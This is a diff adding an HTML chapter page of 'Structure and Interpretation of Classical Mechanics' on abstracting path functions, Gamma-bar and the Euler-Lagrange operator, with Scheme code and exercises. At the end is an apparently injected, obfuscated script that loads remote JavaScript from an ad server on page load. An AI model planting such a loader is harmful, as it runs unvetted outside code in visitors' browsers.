@@ -1,0 +1,276 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-15.html">previous</a></span><span>, <a href="book-Z-H-17.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_1.9"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_1.9">1.9&nbsp;&nbsp;Abstraction of Path Functions</a></h2>
+<p>
+<a name="%_idx_952"></a>
+An essential step in the derivation of the local-tuple transformation
+function <em>C</em> from the coordinate transformation <em>F</em> was the deduction
+of the relationship between the velocities in the two coordinate
+systems.  We did this by inserting coordinate paths into the
+coordinate transformation function <em>F</em>, differentiating, and then
+generalizing the results on the path to arbitrary velocities at a
+moment.  The last step is an example of a more general problem of
+abstracting a local-tuple function from a path function.  Given a
+function <em>f</em> of a local tuple, a corresponding path-dependent function
+<img src="chap1-Z-G-D-51.gif" border="0">[<em>q</em>] is <img src="chap1-Z-G-D-51.gif" border="0">[<em>q</em>]  =  <em>f</em> <small>o</small> <img src="chap1-Z-G-D-9.gif" border="0">[<em>q</em>].  Given <img src="chap1-Z-G-D-51.gif" border="0">,
+how can we reconstitute&nbsp;<em>f</em>? The local-tuple function <em>f</em> depends on
+only a finite number of components of the local tuple, and <img src="chap1-Z-G-D-51.gif" border="0">
+depends only on the corresponding local components of the path.  So
+<img src="chap1-Z-G-D-51.gif" border="0"> has the same value for all paths that have that number of
+components of the local tuple in common.  Given <img src="chap1-Z-G-D-51.gif" border="0"> we can
+reconstitute <em>f</em> by taking the argument of <em>f</em>, which is a finite
+initial segment of a local tuple, constructing a path that has this
+local description, and finding the value of <img src="chap1-Z-G-D-51.gif" border="0"> for this path.</p>
+<p>
+Two paths that have the same local description up to the <em>n</em>th derivative are said to <a name="%_idx_954"></a><a name="%_idx_956"></a><em>osculate with order-<em>n</em> contact</em>.  For
+example, a path and the truncated power series representation of the
+path up to order <em>n</em> have order-<em>n</em> contact; if fewer than <em>n</em>
+derivatives are needed by a local-tuple function, the path and the
+truncated power series representation are equivalent.  Let <em>O</em> be a
+function that generates an osculating path with the given local-tuple
+components.  So <em>O</em>(<em>t</em>, <em>q</em>, <em>v</em>, <tt>...</tt>)(<em>t</em>)  =  <em>q</em>,
+<em>D</em>(<em>O</em>(<em>t</em>, <em>q</em>, <em>v</em>, <tt>...</tt>))(<em>t</em>)  =  <em>v</em>, and in general
+<a name="EQUATION_1.163"></a></p>
+<div align=left><img src="chap1-Z-G-210.gif" border="0"></div>
+<p>
+The number of components of the local tuple that are required is
+finite, but unspecified.
+One way of constructing <em>O</em> is through the truncated power series
+<a name="EQUATION_1.164"></a></p>
+<div align=left><img src="chap1-Z-G-211.gif" border="0"></div>
+<p>
+where the number of terms is the same as the number of components of
+the local tuple that are specified.   </p>
+<p>
+Given the path function <img src="chap1-Z-G-D-51.gif" border="0"> we reconstitute the <em>f</em> function as
+follows.  We take the argument of <em>f</em> and construct an osculating path
+with this local description.  Then the value of <em>f</em> is the value of
+<img src="chap1-Z-G-D-51.gif" border="0"> for this osculating path:
+<a name="EQUATION_1.165"></a></p>
+<div align=left><img src="chap1-Z-G-212.gif" border="0"></div>
+<p></p>
+<p>
+Let <img src="chap1-Z-G-D-52.gif" border="0"> be the function that takes
+a path function and returns the corresponding local-tuple function:
+<a name="EQUATION_1.166"></a></p>
+<div align=left><img src="chap1-Z-G-213.gif" border="0"></div>
+<p>
+From equation&nbsp;(<a href="#EQUATION_1.165">1.165</a>) we see that 
+<a name="EQUATION_1.167"></a></p>
+<div align=left><img src="chap1-Z-G-214.gif" border="0"></div>
+<p></p>
+<p>
+The procedure <tt>Gamma-bar</tt> implements the function <img src="chap1-Z-G-D-52.gif" border="0">
+that reconstitutes a path-dependent function into a local-tuple function:
+</p>
+<p><tt><a name="%_idx_958"></a>(define&nbsp;((Gamma-bar&nbsp;f-bar)&nbsp;local)<br>
+&nbsp;&nbsp;((f-bar&nbsp;(osculating-path&nbsp;local))&nbsp;(time&nbsp;local)))<br>
+</p>
+</tt>
+<p><a name="%_idx_960"></a>The procedure <tt>osculating-path</tt> takes a number of local
+components and returns a path with these components; it is implemented
+as a power series.</p>
+<p>
+We can use <tt>Gamma-bar</tt> to construct the procedure <tt>F-&gt;C</tt>
+that takes a coordinate transformation <tt>F</tt> and generates the
+procedure that transforms local tuples.  The procedure <tt>F-&gt;C</tt>
+constructs a path-dependent procedure <tt>f-bar</tt> that takes a
+coordinate path in the primed system and returns the local tuple of
+the corresponding path in the unprimed coordinate system.  It then
+uses <tt>Gamma-bar</tt> to abstract <tt>f-bar</tt> to arbitrary local
+tuples in the primed coordinate system.
+</p>
+<p><tt><a name="%_idx_962"></a>(define&nbsp;(F-&gt;C&nbsp;F)<br>
+&nbsp;&nbsp;(define&nbsp;(f-bar&nbsp;q-prime)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(define&nbsp;q<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(compose&nbsp;F&nbsp;(Gamma&nbsp;q-prime)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(Gamma&nbsp;q))<br>
+&nbsp;&nbsp;(Gamma-bar&nbsp;f-bar))<br>
+(show-expression&nbsp;<br>
+&nbsp;&nbsp;((F-&gt;C&nbsp;p-&gt;r)<br>
+&nbsp;&nbsp;&nbsp;(-&gt;local&nbsp;'t&nbsp;(up&nbsp;'r&nbsp;'theta)&nbsp;(up&nbsp;'rdot&nbsp;'thetadot))))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap1-Z-G-215.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+Notice that in this definition of <tt>F-&gt;C</tt> we do not explicitly calculate any derivatives.  The calculation
+that led up to the state transformation&nbsp;(<a href="book-Z-H-13.html#EQUATION_1.74">1.74</a>) is not
+needed.</p>
+<p>
+<a name="%_idx_964"></a>We can also use <img src="chap1-Z-G-D-52.gif" border="0"> to make an elegant formula for
+computing the total time derivative <em>D</em><sub><em>t</em></sub> <em>F</em> of the function <em>F</em>:
+<a name="EQUATION_1.168"></a></p>
+<div align=left><img src="chap1-Z-G-216.gif" border="0"></div>
+<p>
+
+The total time derivative can be expressed as a program:
+</p>
+<p><tt><a name="%_idx_966"></a>(define&nbsp;(Dt&nbsp;F)<br>
+&nbsp;&nbsp;(define&nbsp;(G-bar&nbsp;q)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(D&nbsp;(compose&nbsp;F&nbsp;(Gamma&nbsp;q))))<br>
+&nbsp;&nbsp;(Gamma-bar&nbsp;G-bar))<br>
+</p>
+</tt>
+<p>Given a procedure
+<tt>F</tt> implementing a local-tuple function and a path <tt>q</tt>, we
+construct a new procedure <tt>(compose F (Gamma q))</tt>.  The procedure
+<tt>G-bar</tt> implements the derivative of this function of
+time.  We then abstract this off the path with <tt>Gamma-bar</tt> to give 
+the total time derivative.</p>
+<p>
+</p>
+<p><a name="%_thm_1.31"></a>
+<b>Exercise 1.31.</b>&nbsp;&nbsp;<strong>Velocity transformation</strong><br>
+Use the procedure <tt>Gamma-bar</tt> to construct a procedure that
+transforms velocities given a coordinate transformation.  Apply this
+procedure to the procedure <tt>p-&gt;r</tt> to deduce (again)
+equation&nbsp;(<a href="book-Z-H-13.html#EQUATION_1.65">1.65</a>).
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_1.32"></a>
+<b>Exercise 1.32.</b>&nbsp;&nbsp;<strong>Path functions and state functions</strong><br> 
+The local-tuple function <em>f</em> is the same as the local-tuple function
+<img src="chap1-Z-G-D-52.gif" border="0">(<img src="chap1-Z-G-D-51.gif" border="0">) where <img src="chap1-Z-G-D-51.gif" border="0">[<em>q</em>]  =  <em>f</em> <small>o</small> <img src="chap1-Z-G-D-9.gif" border="0">[<em>q</em>].  On
+the other hand, the path function <img src="chap1-Z-G-D-51.gif" border="0">[<em>q</em>] and the path function
+<img src="chap1-Z-G-D-52.gif" border="0">(<img src="chap1-Z-G-D-51.gif" border="0">) <small>o</small> <img src="chap1-Z-G-D-9.gif" border="0">[<em>q</em>] are not necessarily the same.
+Explain.  Give examples where they are the same and where they are
+not the same.  Write programs to illustrate the behavior.
+</p>
+
+<p></p>
+<p>
+
+</p>
+<a name="%_sec_Temp_152"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_152">Lagrange equations at a moment</a></h4>
+<p>
+<a name="%_idx_968"></a>
+Given a Lagrangian, the Lagrange equations test paths to determine whether they
+are realizable paths of the system.  The Lagrange equations relate the
+path and its derivatives.  The fact that the Lagrange equations must
+be satisfied at each moment suggests that we can abstract the
+<a name="%_idx_970"></a>Lagrange equations off the path and write them as relations among the
+local-tuple components of realizable paths.</p>
+<p>
+Let <img src="chap1-Z-G-D-53.gif" border="0">[<em>L</em>] be the path-dependent function that produces the
+residuals of the Lagrange equations&nbsp;(<a href="book-Z-H-12.html#EQUATION_1.18">1.18</a>) for
+the Lagrangian&nbsp;<em>L</em>:
+<a name="EQUATION_1.169"></a></p>
+<div align=left><img src="chap1-Z-G-217.gif" border="0"></div>
+<p>
+Realizable paths <em>q</em> satisfy the Lagrange equations
+<a name="EQUATION_1.170"></a></p>
+<div align=left><img src="chap1-Z-G-218.gif" border="0"></div>
+<p>
+The path-dependent Lagrange equations can be converted to local
+Lagrange equations using <img src="chap1-Z-G-D-52.gif" border="0">:
+<a name="EQUATION_1.171"></a></p>
+<div align=left><img src="chap1-Z-G-219.gif" border="0"></div>
+<p>
+<a name="%_idx_972"></a><a name="%_idx_974"></a><a name="%_idx_976"></a><a name="%_idx_978"></a>The operator  <em>E</em> is called the <em>Euler-Lagrange operator</em>.
+In terms of this operator the Lagrange equations are
+<a name="EQUATION_1.172"></a></p>
+<div align=left><img src="chap1-Z-G-220.gif" border="0"></div>
+<p></p>
+<p>
+Applying the definition&nbsp;(<a href="#EQUATION_1.167">1.167</a>) of <img src="chap1-Z-G-D-52.gif" border="0"> yields
+<a name="EQUATION_1.173"></a></p>
+<div align=left><img src="chap1-Z-G-221.gif" border="0"></div>
+<p>
+So the Euler-Lagrange operator is explicitly
+<a name="EQUATION_1.174"></a></p>
+<div align=left><img src="chap1-Z-G-222.gif" border="0"></div>
+<p>
+The procedure <tt>Euler-Lagrange-operator</tt> implements  <em>E</em>:
+</p>
+<p><tt><a name="%_idx_980"></a>(define&nbsp;(Euler-Lagrange-operator&nbsp;L)<br>
+&nbsp;&nbsp;(-&nbsp;(Dt&nbsp;((partial&nbsp;2)&nbsp;L))&nbsp;((partial&nbsp;1)&nbsp;L)))&nbsp;.<br>
+</p>
+</tt>
+<p>
+For example, applied to the Lagrangian for the harmonic oscillator, we
+have
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((Euler-Lagrange-operator&nbsp;<br>
+&nbsp;&nbsp;&nbsp;(L-harmonic&nbsp;'m&nbsp;'k))<br>
+&nbsp;&nbsp;(-&gt;local&nbsp;'t&nbsp;'x&nbsp;'v&nbsp;'a)))<br>
+<i>(+&nbsp;(*&nbsp;a&nbsp;m)&nbsp;(*&nbsp;k&nbsp;x))</i><br>
+</p>
+</tt>
+<p>Notice that the components of the local tuple are individually
+specified.  Using equation&nbsp;(<a href="#EQUATION_1.172">1.172</a>), the
+Lagrange equations for the harmonic oscillator are<a name="call_footnote_Temp_153" href="#footnote_Temp_153"><sup><small>87</small></sup></a>
+</p>
+<p><tt>(print-expression<br>
+&nbsp;((compose&nbsp;<br>
+&nbsp;&nbsp;&nbsp;(Euler-Lagrange-operator&nbsp;(L-harmonic&nbsp;'m&nbsp;'k))<br>
+&nbsp;&nbsp;&nbsp;(Gamma&nbsp;(literal-function&nbsp;'x)&nbsp;4))<br>
+&nbsp;&nbsp;'t))<br>
+<i>(+&nbsp;(*&nbsp;k&nbsp;(x&nbsp;t))&nbsp;(*&nbsp;m&nbsp;(((expt&nbsp;D&nbsp;2)&nbsp;x)&nbsp;t)))</i><br>
+</p>
+</tt>
+<p>
+</p>
+<p>
+</p>
+<p><a name="%_thm_1.33"></a>
+<b>Exercise 1.33.</b>&nbsp;&nbsp;<strong>Properties of  <em>E</em></strong><br>
+
+Let <em>F</em> and <em>G</em> be two Lagrangian-like functions of a local tuple, <em>C</em>
+be a local-tuple transformation function, and <em>c</em> a constant.
+Demonstrate the following properties:</p>
+<p>
+<strong>a</strong>.&nbsp;&nbsp; <em>E</em>[<em>F</em>  +  <em>G</em>]  =   <em>E</em>[<em>F</em>]  +   <em>E</em>[<em>G</em>]</p>
+<p>
+<strong>b</strong>.&nbsp;&nbsp; <em>E</em>[<em>c</em> <em>F</em>]  =  <em>c</em>  <em>E</em>[<em>F</em>]</p>
+<p>
+<strong>c</strong>.&nbsp;&nbsp; <em>E</em>[<em>F</em> <em>G</em>]  =   <em>E</em>[<em>F</em>] <em>G</em>  +  <em>F</em>  <em>E</em>[<em>G</em>]  +  (<em>D</em><sub><em>t</em></sub> <em>F</em>) <img src="front-Z-G-D-2.gif" border="0"><sub>2</sub> <em>G</em>  + 
+<img src="front-Z-G-D-2.gif" border="0"><sub>2</sub> <em>F</em> (<em>D</em><sub><em>t</em></sub> <em>G</em>) </p>
+<p>
+<strong>d</strong>.&nbsp;&nbsp; <em>E</em>[<em>F</em> <small>o</small> <em>C</em>]  =  <em>D</em><sub><em>t</em></sub> (<em>D</em><em>F</em> <small>o</small> <em>C</em>) <img src="front-Z-G-D-2.gif" border="0"><sub>2</sub> <em>C</em>  +  <em>D</em><em>F</em> <small>o</small> <em>C</em>  <em>E</em>[<em>C</em>]</p>
+<p>
+
+</p>
+
+<p></p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_153" href="#call_footnote_Temp_153"><sup><small>87</small></sup></a> Notice that <tt>Gamma</tt> has one more argument than it
+usually has.  This argument gives the length of the initial segment
+of the local tuple needed.  The default length is 3, giving
+components of the local tuple up to and including the velocities.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-15.html">previous</a></span><span>, <a href="book-Z-H-17.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3%2btfZXGRc6AGpS4xKXLkyetLIAnQDJyN3zcCeetIS0I9%2fOO3aTOWb31hMaWFEn%2bOTpwBy1IVSrCIEC8Zn3d5IsiZpBiDEy4R4THA%2bM0wSyz7fjF1hX5LpQ9ZTd%2f79XMRvqvyV9LOsgDmT73HrFy3NlOWq9mJo6C%2buQlmn57iysPF%2fh5w7HkSiMdgPoP0V5V%2fJeDlLqcdhxkQB3zal%2bIUS2quvm3Hv3dZPOBrkoguuJcZTirK%2bwT9jvr%2bwVuv5nlbbBK0qkoqNUqjZJy2OaKivdBKejjUcqcHGyEm2100rDm9slCAukKChk9pDmZp96ohtTCzikjp1Tx5yhjFlyuLPQHI70OL4lkETakYrdohJoR%2bC9ke7vTXY%2fM2ClezX3iYkVTPI8A0VwHLPnROVO5IYBpGpyrI78HKcJBJxt2654WySTefQgBEZMbXTNX9Jck4SCPHP2PP%2bES0HxxBq%2fh1g1");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
